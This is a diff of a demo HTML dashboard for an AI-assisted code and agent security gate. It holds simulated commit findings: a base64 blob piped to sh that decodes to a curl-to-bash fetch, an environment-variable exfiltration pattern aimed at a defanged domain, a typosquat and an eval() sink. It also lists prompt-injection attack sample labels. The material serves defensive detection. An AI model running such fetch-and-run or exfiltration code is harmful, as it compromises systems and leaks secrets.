@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>GuardAgent Control Plane — AI Security Gate</title>
+<title>GuardAgent Control Plane - AI Security Gate</title>
 <style>
 :root{
   --bg:#0a0e14; --bg2:#0e131c; --surface:#111826; --surface2:#16202f; --line:#1e2a3d;
@@ -84,7 +84,7 @@ body{background:var(--bg);color:var(--txt);font-family:'Inter','Segoe UI',system
 .help-dl dt:first-child{margin-top:0}
 .help-dl dt[onclick]{cursor:pointer;color:var(--accent)}
 .help-dl dt[onclick]:hover{text-decoration:underline}
-.help-dl dt[onclick]::after{content:'→';font-size:.75rem;opacity:.5}
+.help-dl dt[onclick]::after{content:'->';font-size:.75rem;opacity:.5}
 .help-dl dd{margin:2px 0 0;font-size:.8rem;color:var(--txt3);line-height:1.5}
 .orma-tests{margin-top:10px;border-top:1px dashed var(--line);padding-top:8px;display:flex;flex-direction:column;gap:4px}
 .orma-test{display:flex;gap:8px;align-items:flex-start;font-size:.76rem;color:var(--txt2);cursor:pointer;line-height:1.4}
@@ -276,7 +276,7 @@ textarea.code-in:focus{border-color:var(--accent2)}
     <div class="nav-label">Support</div>
     <a href="#help" data-view="help"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor"><circle cx="12" cy="12" r="9"/><path d="M9.1 9a3 3 0 0 1 5.8 1c0 2-3 3-3 3"/><path d="M12 17h.01"/></svg>Help &amp; Docs</a>
   </nav>
-  <div class="sidebar-foot">Engine <b id="engine-name">local heuristics (offline)</b><br>Policy pack <b>v2026.07 · 148 rules</b><br><span class="badge b-ok pulse" id="gate-badge" style="margin-top:6px">STATIC DEMO</span></div>
+  <div class="sidebar-foot">Engine <b id="engine-name">local heuristics (offline)</b><br>Policy pack <b>v2026.07 -  148 rules</b><br><span class="badge b-ok pulse" id="gate-badge" style="margin-top:6px">STATIC DEMO</span></div>
 </aside>
 
 <!-- ======================= MAIN ======================= -->
@@ -284,9 +284,9 @@ textarea.code-in:focus{border-color:var(--accent2)}
   <header class="topbar">
     <button class="icon-btn menu-btn" onclick="document.getElementById('sidebar').classList.toggle('open')" aria-label="Menu">☰</button>
     <div class="crumb"><b id="crumb">Executive Dashboard</b></div>
-    <div class="search"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="11" cy="11" r="7"/><path d="m21 21-4-4"/></svg><input placeholder="Search commits, findings, agents, policies…" id="global-search"></div>
+    <div class="search"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="11" cy="11" r="7"/><path d="m21 21-4-4"/></svg><input placeholder="Search commits, findings, agents, policies..." id="global-search"></div>
     <div class="top-right">
-      <div class="env-pill"><span class="dot"></span>prod · eu-west-1</div>
+      <div class="env-pill"><span class="dot"></span>prod -  eu-west-1</div>
       <div class="clock" id="clock"></div>
       <button class="icon-btn" onclick="toggleTheme()" title="Toggle theme" aria-label="Toggle theme"><span id="theme-ico">◐</span></button>
       <div class="avatar">CM</div>
@@ -299,12 +299,12 @@ textarea.code-in:focus{border-color:var(--accent2)}
   <section class="view active" id="view-dashboard">
     <div class="page-head">
       <div><h1>Executive Dashboard</h1><p>Unified posture across commit scanning, pipeline gates, AI agent policy and operational exposure. Objective: shorten the path from risky commit to understood risk to remediation.</p></div>
-      <div style="display:flex;gap:8px"><button class="btn ghost sm" onclick="toast('Report queued — weekly posture PDF will be delivered to CISO distribution list.')">Export CISO report</button><button class="btn sm" onclick="go('triage')">Open triage queue</button></div>
+      <div style="display:flex;gap:8px"><button class="btn ghost sm" onclick="toast('Report queued - weekly posture PDF will be delivered to CISO distribution list.')">Export CISO report</button><button class="btn sm" onclick="go('triage')">Open triage queue</button></div>
     </div>
     <div class="grid g4" id="kpi-row"></div>
     <div class="grid g23 mt">
       <div class="card">
-        <h3>Scan volume &amp; blocked events — 14 days</h3>
+        <h3>Scan volume &amp; blocked events - 14 days</h3>
         <svg id="main-chart" width="100%" height="190" preserveAspectRatio="none"></svg>
         <div style="display:flex;gap:18px;font-size:.72rem;color:var(--txt2);margin-top:8px">
           <span><i style="display:inline-block;width:10px;height:3px;background:var(--accent);border-radius:2px;vertical-align:middle"></i> Commits scanned</span>
@@ -359,26 +359,26 @@ textarea.code-in:focus{border-color:var(--accent2)}
   <!-- ========== 3. AI CODE INSPECTION ========== -->
   <section class="view" id="view-inspect">
     <div class="page-head">
-      <div><h1>AI Code Inspection Studio</h1><p>Paste code, a diff, a Dockerfile, CI config or requirements file. The multi-layer analyzer runs secret scanning, supply-chain checks, injection/obfuscation detection and exfiltration path analysis — locally, in your browser.</p></div>
+      <div><h1>AI Code Inspection Studio</h1><p>Paste code, a diff, a Dockerfile, CI config or requirements file. The multi-layer analyzer runs secret scanning, supply-chain checks, injection/obfuscation detection and exfiltration path analysis - locally, in your browser.</p></div>
       <div style="display:flex;gap:8px">
         <select id="sample-select" class="btn ghost sm" style="appearance:auto">
-          <option value="">Load demo sample…</option>
-          <option value="exfil">Python — env exfiltration</option>
-          <option value="typosquat">requirements.txt — typosquat</option>
-          <option value="docker">Dockerfile — fragile build</option>
-          <option value="ci">.gitlab-ci.yml — permissive rule</option>
-          <option value="clean">Python — clean utility</option>
+          <option value="">Load demo sample...</option>
+          <option value="exfil">Python - env exfiltration</option>
+          <option value="typosquat">requirements.txt - typosquat</option>
+          <option value="docker">Dockerfile - fragile build</option>
+          <option value="ci">.gitlab-ci.yml - permissive rule</option>
+          <option value="clean">Python - clean utility</option>
         </select>
       </div>
     </div>
     <div class="inspect-grid">
       <div>
-        <textarea class="code-in" id="code-input" spellcheck="false" placeholder="# Paste code, diff, Dockerfile, CI YAML or requirements.txt here…"></textarea>
+        <textarea class="code-in" id="code-input" spellcheck="false" placeholder="# Paste code, diff, Dockerfile, CI YAML or requirements.txt here..."></textarea>
         <div style="display:flex;gap:8px;margin-top:10px;align-items:center">
           <button class="btn" id="analyze-btn" onclick="runInspection()">▶ Run deep analysis</button>
           <button class="btn ghost" id="fix-btn" onclick="runFix()">✚ Generate AI fix</button>
           <button class="btn ghost" onclick="document.getElementById('code-input').value='';document.getElementById('inspect-out').innerHTML=emptyInspect()">Clear</button>
-          <span class="dim" style="font-size:.72rem;margin-left:auto">Layers: secrets · deps · injection · obfuscation · exfiltration · CI policy · agent safety</span>
+          <span class="dim" style="font-size:.72rem;margin-left:auto">Layers: secrets -  deps -  injection -  obfuscation -  exfiltration -  CI policy -  agent safety</span>
         </div>
       </div>
       <div id="inspect-out"></div>
@@ -388,10 +388,10 @@ textarea.code-in:focus{border-color:var(--accent2)}
   <!-- ========== 3b. PROMPT SHIELD (AI FIREWALL) ========== -->
   <section class="view" id="view-shield">
     <div class="page-head">
-      <div><h1>Prompt-Injection Shield</h1><p>The runtime firewall for agentic AI. Every prompt, retrieved document and tool output is screened <b>before</b> it reaches your agents: 14 deterministic detectors plus a GPT-5.6 intent pass. Verdicts — PASS · SANITIZE · BLOCK — land in the same audit trail as code scans.</p></div>
+      <div><h1>Prompt-Injection Shield</h1><p>The runtime firewall for agentic AI. Every prompt, retrieved document and tool output is screened <b>before</b> it reaches your agents: 14 deterministic detectors plus a GPT-5.6 intent pass. Verdicts - PASS -  SANITIZE -  BLOCK - land in the same audit trail as code scans.</p></div>
       <div style="display:flex;gap:8px">
         <select id="shield-sample" class="btn ghost sm" style="appearance:auto">
-          <option value="">Load attack sample…</option>
+          <option value="">Load attack sample...</option>
           <option value="override">Instruction override + exfil</option>
           <option value="roleplay">Persona jailbreak</option>
           <option value="poison">Poisoned RAG document</option>
@@ -402,7 +402,7 @@ textarea.code-in:focus{border-color:var(--accent2)}
     </div>
     <div class="inspect-grid">
       <div>
-        <textarea class="code-in" id="shield-input" spellcheck="false" placeholder="Paste a prompt, a retrieved RAG chunk, or a tool output destined for an AI agent…"></textarea>
+        <textarea class="code-in" id="shield-input" spellcheck="false" placeholder="Paste a prompt, a retrieved RAG chunk, or a tool output destined for an AI agent..."></textarea>
         <div style="display:flex;gap:8px;margin-top:10px;align-items:center">
           <button class="btn" id="shield-btn" onclick="runShield()">🛡 Screen content</button>
           <select id="shield-source" class="btn ghost sm" style="appearance:auto">
@@ -410,7 +410,7 @@ textarea.code-in:focus{border-color:var(--accent2)}
             <option value="retrieved-doc">Source: retrieved document</option>
             <option value="tool-output">Source: tool output</option>
           </select>
-          <span class="dim" style="font-size:.72rem;margin-left:auto">Detectors: hijack · exfil · smuggling · tool-abuse · persona · recon</span>
+          <span class="dim" style="font-size:.72rem;margin-left:auto">Detectors: hijack -  exfil -  smuggling -  tool-abuse -  persona -  recon</span>
         </div>
       </div>
       <div id="shield-out"></div>
@@ -429,7 +429,7 @@ textarea.code-in:focus{border-color:var(--accent2)}
   <!-- ========== 5. AGENT SECURITY CONSOLE ========== -->
   <section class="view" id="view-agents">
     <div class="page-head">
-      <div><h1>Agent Security Console</h1><p>AI agents are actors, not just tools. Every tool call is evaluated against execution policy before it runs: sandboxed, approved, denied or escalated — with a full decision trace.</p></div>
+      <div><h1>Agent Security Console</h1><p>AI agents are actors, not just tools. Every tool call is evaluated against execution policy before it runs: sandboxed, approved, denied or escalated - with a full decision trace.</p></div>
       <button class="btn ghost sm" onclick="toast('Execution policy editor requires the platform-admin role.')">Edit execution policy</button>
     </div>
     <div class="grid g4" id="agent-kpis"></div>
@@ -446,7 +446,7 @@ textarea.code-in:focus{border-color:var(--accent2)}
           <div class="timeline" id="agent-timeline"></div>
         </div>
         <div class="card mt">
-          <h3>Denied operations — 24h</h3>
+          <h3>Denied operations - 24h</h3>
           <div id="denied-ops"></div>
         </div>
       </div>
@@ -457,7 +457,7 @@ textarea.code-in:focus{border-color:var(--accent2)}
   <section class="view" id="view-exposure">
     <div class="page-head">
       <div><h1>Threat &amp; Exposure Watch</h1><p>Security does not stop at the diff. Internet exposure, KEV-listed vulnerabilities, patch debt and backup integrity weigh on the same posture score as code findings.</p></div>
-      <button class="btn ghost sm" onclick="renderKEV(true)">↻ Refresh KEV feed</button>
+      <button class="btn ghost sm" onclick="renderKEV(true)"> Refresh KEV feed</button>
     </div>
 
     <!-- Live CISA KEV intelligence -->
@@ -465,7 +465,7 @@ textarea.code-in:focus{border-color:var(--accent2)}
       <h3 style="display:flex;align-items:center;gap:8px">
         <span class="badge b-crit pulse" style="letter-spacing:.06em">EXPLOITED IN THE WILD</span>
         Live CISA Known-Exploited-Vulnerabilities catalog
-        <span id="kev-src" class="dim mono" style="margin-left:auto;font-size:.68rem;font-weight:400">connecting…</span>
+        <span id="kev-src" class="dim mono" style="margin-left:auto;font-size:.68rem;font-weight:400">connecting...</span>
       </h3>
       <div class="grid g4" id="kev-tiles" style="margin-bottom:14px"></div>
       <div class="controls" id="kev-controls" style="display:flex;flex-wrap:wrap;gap:8px;margin-bottom:12px">
@@ -473,9 +473,9 @@ textarea.code-in:focus{border-color:var(--accent2)}
         <button class="btn ghost sm kevf" data-kf="db">Database</button>
         <button class="btn ghost sm kevf" data-kf="os">OS / infra</button>
         <button class="btn ghost sm kevf" data-kf="ransom">Ransomware-linked</button>
-        <button class="btn ghost sm kevf" data-kf="new">Added ≤ 7 days</button>
+        <button class="btn ghost sm kevf" data-kf="new">Added <= 7 days</button>
       </div>
-      <div id="kev-feed"><div class="dim" style="padding:20px;text-align:center">Loading live data from CISA…</div></div>
+      <div id="kev-feed"><div class="dim" style="padding:20px;text-align:center">Loading live data from CISA...</div></div>
     </div>
 
     <div class="grid g4" id="exp-kpis"></div>
@@ -485,8 +485,8 @@ textarea.code-in:focus{border-color:var(--accent2)}
         <div id="exp-services"></div>
       </div>
       <div class="card">
-        <h3>Ransomware-linked KEV · nearest remediation deadlines</h3>
-        <div id="kev-list"><div class="dim" style="font-size:.75rem">Loading from live catalog…</div></div>
+        <h3>Ransomware-linked KEV -  nearest remediation deadlines</h3>
+        <div id="kev-list"><div class="dim" style="font-size:.75rem">Loading from live catalog...</div></div>
       </div>
     </div>
     <div class="grid g2 mt">
@@ -504,7 +504,7 @@ textarea.code-in:focus{border-color:var(--accent2)}
   <!-- ========== 7. NIST GOVERNANCE CENTER ========== -->
   <section class="view" id="view-nist">
     <div class="page-head">
-      <div><h1>NIST Governance Center</h1><p>Every finding is mapped to NIST CSF 2.0 functions with an owner, an SLA and evidence. Governance means the risk has a name attached to it — not just a severity.</p></div>
+      <div><h1>NIST Governance Center</h1><p>Every finding is mapped to NIST CSF 2.0 functions with an owner, an SLA and evidence. Governance means the risk has a name attached to it - not just a severity.</p></div>
       <button class="btn ghost sm" onclick="toast('CSF 2.0 control mapping exported (csf-mapping.xlsx).')">Export mapping</button>
     </div>
     <div class="nist-band" id="nist-band"></div>
@@ -519,7 +519,7 @@ textarea.code-in:focus{border-color:var(--accent2)}
   <!-- ========== RESILIENCE MATURITY (ORMA) ========== -->
   <section class="view" id="view-resilience">
     <div class="page-head">
-      <div><h1>Resilience Maturity — ORMA</h1><p>Operational Resilience Maturity Assessment across 10 domains, on a 5-level scale. Run the tests per domain: check the criteria you meet, and the maturity level, gap-to-target and roadmap update live. Modelled on the CDPQ operational-resilience framework.</p></div>
+      <div><h1>Resilience Maturity - ORMA</h1><p>Operational Resilience Maturity Assessment across 10 domains, on a 5-level scale. Run the tests per domain: check the criteria you meet, and the maturity level, gap-to-target and roadmap update live. Modelled on the CDPQ operational-resilience framework.</p></div>
       <div style="display:flex;gap:8px">
         <button class="btn ghost sm" onclick="resetOrma()">Reset</button>
         <button class="btn ghost sm" onclick="exportOrma()">Export assessment</button>
@@ -534,7 +534,7 @@ textarea.code-in:focus{border-color:var(--accent2)}
           <div id="orma-scale"></div>
         </div>
         <div class="card">
-          <h3>Roadmap — largest gaps first</h3>
+          <h3>Roadmap - largest gaps first</h3>
           <div id="orma-roadmap"></div>
         </div>
       </div>
@@ -564,7 +564,7 @@ textarea.code-in:focus{border-color:var(--accent2)}
       <div><h1>Help &amp; Docs</h1><p>How GuardAgent Control Plane works, what each module does, and how the scoring gate reaches a decision. Everything here reflects the live engine, not marketing copy.</p></div>
       <div style="display:flex;gap:8px">
         <button class="btn ghost sm" onclick="go('inspect');toast('Paste code and run a live scan.')">Open Inspection studio</button>
-        <a class="btn ghost sm" href="https://github.com/wecanmoove/guardagent-control-plane" target="_blank" rel="noopener">GitHub repo ↗</a>
+        <a class="btn ghost sm" href="https://github.com/wecanmoove/guardagent-control-plane" target="_blank" rel="noopener">GitHub repo ^</a>
       </div>
     </div>
 
@@ -573,7 +573,7 @@ textarea.code-in:focus{border-color:var(--accent2)}
       <ol style="margin:0;padding-left:20px;font-size:.86rem;line-height:1.7;color:var(--txt2)">
         <li>Go to <b>AI Code Inspection</b> and pick a demo sample (or paste your own code, diff, Dockerfile or CI file).</li>
         <li>Click <b>Run deep analysis</b>. The engine runs 7 layers, then returns a verdict: <b>Allow / Review / Block / Quarantine</b>.</li>
-        <li>When served from the backend, the verdict is confirmed by <b>Gemini 2.5&nbsp;Flash</b> and written to the <b>Evidence &amp; Audit Trail</b> with an <span class="mono">EV-…</span> id.</li>
+        <li>When served from the backend, the verdict is confirmed by <b>Gemini 2.5&nbsp;Flash</b> and written to the <b>Evidence &amp; Audit Trail</b> with an <span class="mono">EV-...</span> id.</li>
         <li>Review governance in <b>NIST Governance Center</b>; export the trail for auditors from <b>Evidence &amp; Audit Trail</b>.</li>
       </ol>
     </div>
@@ -584,12 +584,12 @@ textarea.code-in:focus{border-color:var(--accent2)}
         <dl class="help-dl">
           <dt onclick="go('dashboard')">Executive Dashboard</dt><dd>Posture score, scan volume, blocked pipelines, SLA debt and a prioritized feed of the latest critical events.</dd>
           <dt onclick="go('triage')">Commit Risk Triage</dt><dd>Incoming commits ranked by composite risk. Click a row for the diff, triggered rules, MITRE ATT&amp;CK mapping and the recommended decision.</dd>
-          <dt onclick="go('inspect')">AI Code Inspection</dt><dd>The live analysis studio. Deterministic engine + Gemini reasoning → an explained Allow/Review/Block/Quarantine verdict.</dd>
-          <dt onclick="go('gates')">Pipeline Gate Center</dt><dd>Every CI/CD stage with its status and the reason a pipeline was blocked — policy-as-code meets AI reasoning.</dd>
+          <dt onclick="go('inspect')">AI Code Inspection</dt><dd>The live analysis studio. Deterministic engine + Gemini reasoning -> an explained Allow/Review/Block/Quarantine verdict.</dd>
+          <dt onclick="go('gates')">Pipeline Gate Center</dt><dd>Every CI/CD stage with its status and the reason a pipeline was blocked - policy-as-code meets AI reasoning.</dd>
           <dt onclick="go('agents')">Agent Security Console</dt><dd>AI agents as monitored actors: each tool call is evaluated by policy before it runs (Allow / Sandbox / Escalate / Deny).</dd>
           <dt onclick="go('exposure')">Threat &amp; Exposure Watch</dt><dd>Operational exposure beyond code: internet surface, KEV, ransomware-linked alerts, patch debt and backup assurance.</dd>
           <dt onclick="go('nist')">NIST Governance Center</dt><dd>Each finding mapped to NIST CSF 2.0 (Govern/Identify/Protect/Detect/Respond/Recover) with owner, SLA and evidence.</dd>
-          <dt onclick="go('audit')">Evidence &amp; Audit Trail</dt><dd>Immutable, exportable log of every decision — built for internal audit, compliance and CISO reporting.</dd>
+          <dt onclick="go('audit')">Evidence &amp; Audit Trail</dt><dd>Immutable, exportable log of every decision - built for internal audit, compliance and CISO reporting.</dd>
         </dl>
       </div>
 
@@ -600,13 +600,13 @@ textarea.code-in:focus{border-color:var(--accent2)}
           <table style="width:100%;font-size:.78rem">
             <thead><tr><th style="text-align:left">Verdict</th><th style="text-align:left">Triggered when</th></tr></thead>
             <tbody>
-              <tr><td><span class="badge v-quarantine">QUARANTINE</span></td><td>≥2 critical, or a critical supply-chain / exfiltration signal — artifact is isolated from any build.</td></tr>
-              <tr><td><span class="badge v-block">BLOCK</span></td><td>≥1 critical finding, or composite risk ≥ 55 — merge blocked pending fix.</td></tr>
-              <tr><td><span class="badge v-review">REVIEW</span></td><td>≥1 high finding, or accumulated mediums (risk ≥ 25) — human review required.</td></tr>
-              <tr><td><span class="badge v-allow">ALLOW</span></td><td>Only low-impact hygiene findings, or nothing detected — allowed with annotations.</td></tr>
+              <tr><td><span class="badge v-quarantine">QUARANTINE</span></td><td>>=2 critical, or a critical supply-chain / exfiltration signal - artifact is isolated from any build.</td></tr>
+              <tr><td><span class="badge v-block">BLOCK</span></td><td>>=1 critical finding, or composite risk >= 55 - merge blocked pending fix.</td></tr>
+              <tr><td><span class="badge v-review">REVIEW</span></td><td>>=1 high finding, or accumulated mediums (risk >= 25) - human review required.</td></tr>
+              <tr><td><span class="badge v-allow">ALLOW</span></td><td>Only low-impact hygiene findings, or nothing detected - allowed with annotations.</td></tr>
             </tbody>
           </table>
-          <p style="font-size:.76rem;color:var(--txt3);margin:10px 0 0">Axes: code · supply chain · exfiltration · exposure · AI-agent · business urgency.</p>
+          <p style="font-size:.76rem;color:var(--txt3);margin:10px 0 0">Axes: code -  supply chain -  exfiltration -  exposure -  AI-agent -  business urgency.</p>
         </div>
         <div class="card">
           <h3>🛡️ Detection coverage</h3>
@@ -619,7 +619,7 @@ textarea.code-in:focus{border-color:var(--accent2)}
     <div class="grid g2 mt" style="align-items:start">
       <div class="card">
         <h3>🤖 Engine &amp; Gemini status</h3>
-        <div id="help-engine" style="font-size:.84rem;line-height:1.8;color:var(--txt2)">Checking backend…</div>
+        <div id="help-engine" style="font-size:.84rem;line-height:1.8;color:var(--txt2)">Checking backend...</div>
         <p style="font-size:.76rem;color:var(--txt3);margin:10px 0 0">Open the HTML file directly and the studio uses the in-browser analyzer. Serve it from the FastAPI backend with a <span class="mono">GEMINI_API_KEY</span> (or Vertex AI) and verdicts are confirmed by <span class="mono">gemini-2.5-flash</span> and persisted.</p>
       </div>
       <div class="card">
@@ -637,7 +637,7 @@ textarea.code-in:focus{border-color:var(--accent2)}
       <h3>❓ FAQ</h3>
       <dl class="help-dl">
         <dt style="cursor:default">Is the analysis real or simulated?</dt><dd>The <b>analysis engine, Gemini reasoning, agent policy and audit trail are real</b> and computed live. The dashboard KPIs (posture score, weekly counts) are credible demo data for presentation.</dd>
-        <dt style="cursor:default">Is this safe to run against real code?</dt><dd>Yes — it performs static pattern analysis only. It never executes the code it inspects. Use it for defensive security testing and secure development.</dd>
+        <dt style="cursor:default">Is this safe to run against real code?</dt><dd>Yes - it performs static pattern analysis only. It never executes the code it inspects. Use it for defensive security testing and secure development.</dd>
         <dt style="cursor:default">What happens to a leaked secret I paste?</dt><dd>It is scanned in-process and, if backend-served, a redacted finding + evidence id is stored locally in SQLite. Nothing is sent anywhere except (optionally) to Gemini for reasoning. Still, always rotate any real secret that leaks.</dd>
         <dt style="cursor:default">How do I connect Gemini?</dt><dd>Set <span class="mono">GEMINI_API_KEY</span>, or <span class="mono">GOOGLE_GENAI_USE_VERTEXAI=true</span> on Cloud Run, then restart the server. The sidebar badge flips to <b>GEMINI LIVE</b>.</dd>
       </dl>
@@ -664,7 +664,7 @@ textarea.code-in:focus{border-color:var(--accent2)}
 <script>
 'use strict';
 /* =====================================================================
-   GuardAgent Control Plane — demo build
+   GuardAgent Control Plane - demo build
    Single-file prototype. All data simulated; the code inspector runs a
    real multi-layer static heuristic engine client-side.
    ===================================================================== */
@@ -673,8 +673,8 @@ textarea.code-in:focus{border-color:var(--accent2)}
 const DB = {
   kpis: [
     {label:'Posture score', value:'82', delta:'+4 pts', up:true, spark:[71,73,72,75,74,77,78,76,79,80,79,81,80,82]},
-    {label:'Commits scanned · 7d', value:'1,284', delta:'+11%', up:true, spark:[140,155,162,148,171,180,189,176,182,190,178,195,201,188]},
-    {label:'Pipelines blocked · 7d', value:'17', delta:'-3 vs last wk', up:true, spark:[5,3,4,2,3,4,2,3,1,2,3,2,2,1], alert:false},
+    {label:'Commits scanned -  7d', value:'1,284', delta:'+11%', up:true, spark:[140,155,162,148,171,180,189,176,182,190,178,195,201,188]},
+    {label:'Pipelines blocked -  7d', value:'17', delta:'-3 vs last wk', up:true, spark:[5,3,4,2,3,4,2,3,1,2,3,2,2,1], alert:false},
     {label:'Active critical findings', value:'4', delta:'2 past SLA', up:false, alert:true, spark:[2,3,3,4,3,5,4,4,6,5,4,5,4,4]},
   ],
   trend: {
@@ -691,12 +691,12 @@ const DB = {
     {name:'Business urgency', val:76, color:'var(--review)'},
   ],
   critFeed: [
-    {sev:'crit', title:'Commit blocked due to likely secret exfiltration path', meta:'payments-api · a3f92c1 · rule EXF-004 · 6 min ago'},
-    {sev:'crit', title:'Agent action denied by execution policy — shell escape attempt', meta:'deploy-agent-02 · tool:run_shell · POL-AGT-011 · 18 min ago'},
-    {sev:'warn', title:'Human review required for encoded payload in build script', meta:'ml-training-jobs · 7bd201e · rule OBF-002 · 41 min ago'},
-    {sev:'warn', title:'Patch exposure exceeds policy threshold on edge gateway', meta:'edge-gw-eu-03 · KEV CVE-2026-21771 · 1 h ago'},
-    {sev:'quar', title:'Dependency quarantined — typosquat confidence 0.94', meta:'data-platform · package "python-dateutils" · SUP-009 · 2 h ago'},
-    {sev:'ok', title:'Secret rotated and history purged — incident closed', meta:'billing-svc · GitLab PAT · MTTR 42 min · 3 h ago'},
+    {sev:'crit', title:'Commit blocked due to likely secret exfiltration path', meta:'payments-api -  a3f92c1 -  rule EXF-004 -  6 min ago'},
+    {sev:'crit', title:'Agent action denied by execution policy - shell escape attempt', meta:'deploy-agent-02 -  tool:run_shell -  POL-AGT-011 -  18 min ago'},
+    {sev:'warn', title:'Human review required for encoded payload in build script', meta:'ml-training-jobs -  7bd201e -  rule OBF-002 -  41 min ago'},
+    {sev:'warn', title:'Patch exposure exceeds policy threshold on edge gateway', meta:'edge-gw-eu-03 -  KEV CVE-2026-21771 -  1 h ago'},
+    {sev:'quar', title:'Dependency quarantined - typosquat confidence 0.94', meta:'data-platform -  package "python-dateutils" -  SUP-009 -  2 h ago'},
+    {sev:'ok', title:'Secret rotated and history purged - incident closed', meta:'billing-svc -  GitLab PAT -  MTTR 42 min -  3 h ago'},
   ],
   sla: [
     {name:'Rotate exposed service token (billing-svc)', owner:'K. Osei', due:'overdue 6 h', pct:100, crit:true},
@@ -708,7 +708,7 @@ const DB = {
   commits: [
     {sha:'a3f92c1', repo:'payments-api', branch:'feat/refund-flow', author:'j.moreau', threat:'Secret exfiltration', sev:'critical', conf:0.97, decision:'Block', age:'6 min',
      files:['app/services/refund.py','app/utils/net.py'],
-     summary:'The diff introduces a function that reads os.environ in bulk and POSTs a JSON payload to an unregistered external domain (hxxps://metrics-relay[.]dev). The call is wrapped in a broad try/except that silences failures — a classic quiet-exfiltration pattern.',
+     summary:'The diff introduces a function that reads os.environ in bulk and POSTs a JSON payload to an unregistered external domain (hxxps://metrics-relay[.]dev). The call is wrapped in a broad try/except that silences failures - a classic quiet-exfiltration pattern.',
      rules:['EXF-004 env-bulk-read + external POST','NET-002 unregistered egress domain','ERR-007 silenced exception around network I/O'],
      mitre:['T1552.001 Unsecured Credentials: In Files','T1041 Exfiltration Over C2 Channel','T1027 Obfuscated Files or Information'],
      diff:`+ import requests, os, json
@@ -723,7 +723,7 @@ const DB = {
      actions:['Block merge','Quarantine branch','Open incident','Notify author']},
     {sha:'7bd201e', repo:'ml-training-jobs', branch:'main', author:'ci-bot', threat:'Obfuscated payload', sev:'high', conf:0.88, decision:'Review', age:'41 min',
      files:['scripts/bootstrap.sh'],
-     summary:'A base64 blob is decoded and piped to sh during container bootstrap. Decoded content resolves to a curl download from a raw gist followed by chmod +x. Could be a legitimate but unsafe install pattern — human review required for encoded payload.',
+     summary:'A base64 blob is decoded and piped to sh during container bootstrap. Decoded content resolves to a curl download from a raw gist followed by chmod +x. Could be a legitimate but unsafe install pattern - human review required for encoded payload.',
      rules:['OBF-002 base64-decode piped to shell','SUP-014 remote script execution at build time'],
      mitre:['T1059.004 Command and Scripting Interpreter: Unix Shell','T1140 Deobfuscate/Decode Files'],
      diff:`+ PAYLOAD="Y3VybCAtcyBodHRwczovL2dpc3QuLi4gfCBiYXNoCg=="
@@ -731,8 +731,8 @@ const DB = {
      actions:['Request human review','Block until approved','Trace artifact']},
     {sha:'c119f04', repo:'data-platform', branch:'feat/etl-retry', author:'m.laurent', threat:'Dependency risk', sev:'high', conf:0.94, decision:'Quarantine', age:'2 h',
      files:['requirements.txt'],
-     summary:'requirements.txt adds "python-dateutils==2.9.1" — a known typosquat of python-dateutil. Package registry telemetry shows the squatted name publishing a post-install hook contacting a paste service. Dependency quarantined pending replacement.',
-     rules:['SUP-009 typosquat lexical distance ≤ 2','SUP-003 post-install network activity (registry intel)'],
+     summary:'requirements.txt adds "python-dateutils==2.9.1" - a known typosquat of python-dateutil. Package registry telemetry shows the squatted name publishing a post-install hook contacting a paste service. Dependency quarantined pending replacement.',
+     rules:['SUP-009 typosquat lexical distance <= 2','SUP-003 post-install network activity (registry intel)'],
      mitre:['T1195.002 Supply Chain Compromise: Software Supply Chain'],
      diff:`  pandas==2.2.3
 - python-dateutil==2.9.0
@@ -741,7 +741,7 @@ const DB = {
      actions:['Quarantine dependency','Suggest safe package','Notify owner']},
     {sha:'e88d3a7', repo:'billing-svc', branch:'hotfix/webhook-retry', author:'k.osei', threat:'Hardcoded secret', sev:'critical', conf:0.99, decision:'Block', age:'3 h',
      files:['app/config.py'],
-     summary:'A GitLab personal access token (glpat-…) was committed in plaintext in config.py. Token scope includes api + write_repository. Commit blocked at pre-receive; rotation runbook triggered automatically.',
+     summary:'A GitLab personal access token (glpat-...) was committed in plaintext in config.py. Token scope includes api + write_repository. Commit blocked at pre-receive; rotation runbook triggered automatically.',
      rules:['SEC-001 GitLab PAT signature','SEC-020 credential in config file'],
      mitre:['T1552.001 Unsecured Credentials: In Files'],
      diff:`- GITLAB_TOKEN = os.environ["GITLAB_TOKEN"]
@@ -763,7 +763,7 @@ const DB = {
     stage: test
 +   allow_failure: true
 +   rules:
-+     - if: $CI_PIPELINE_SOURCE == "schedule"`,
++ - if: $CI_PIPELINE_SOURCE == "schedule"`,
      actions:['Restore gate','Escalate to platform team']},
     {sha:'4de09cc', repo:'notify-worker', branch:'feat/i18n', author:'a.benali', threat:'None detected', sev:'low', conf:0.99, decision:'Allow', age:'9 h',
      files:['worker/i18n/fr.json','worker/i18n/de.json'],
@@ -771,7 +771,7 @@ const DB = {
      rules:['FP-002 static asset fast-path'], mitre:[],
      diff:`+ "invoice.reminder.subject": "Rappel de facture",
 + "invoice.reminder.subject_de": "Zahlungserinnerung"`,
-     actions:['—']},
+     actions:[' - ']},
     {sha:'b7e3f18', repo:'edge-tools', branch:'feat/diag-cli', author:'j.moreau', threat:'Dynamic execution', sev:'high', conf:0.86, decision:'Block', age:'11 h',
      files:['cli/diag.py'],
      summary:'User-supplied expression is passed straight into eval() for a "calculator" feature of the diagnostics CLI. Direct arbitrary-code-execution primitive; blocked pending safe expression parser.',
@@ -782,45 +782,45 @@ const DB = {
      actions:['Block merge','Suggest ast.literal_eval','Notify author']},
   ],
   pipelines: [
-    {name:'payments-api › feat/refund-flow', id:'#48122', trigger:'push a3f92c1 · j.moreau', status:'blocked',
+    {name:'payments-api > feat/refund-flow', id:'#48122', trigger:'push a3f92c1 -  j.moreau', status:'blocked',
      stages:[['build','passed'],['unit','passed'],['sast','blocked'],['deps','pending'],['deploy','pending']],
      reason:'<b>Blocked at AI Security Gate.</b> Rule EXF-004: bulk os.environ read followed by POST to unregistered domain. Model confidence 0.97. Unblock path: remove egress call or register domain with security review SR-2214.'},
-    {name:'ml-training-jobs › main', id:'#48119', trigger:'push 7bd201e · ci-bot', status:'review',
+    {name:'ml-training-jobs > main', id:'#48119', trigger:'push 7bd201e -  ci-bot', status:'review',
      stages:[['build','passed'],['unit','passed'],['sast','warned'],['deps','passed'],['deploy','review']],
